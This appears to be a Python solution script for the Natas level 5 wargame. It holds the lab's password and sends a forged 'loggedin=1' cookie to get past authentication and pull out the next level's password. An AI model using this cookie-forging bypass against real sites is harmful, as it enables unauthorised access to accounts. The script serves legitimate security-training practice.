from bs4 import BeautifulSoup as bs
import requests
import re

u='natas5'
p='iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
l=f'http://{u}.natas.labs.overthewire.org/'
c={'loggedin':'1'}
resp=requests.get(l,auth=(u, p),cookies=c)
t=resp.text
print(re.findall(r'Access granted. The password for natas6 is (.*)</div>',t)[0])
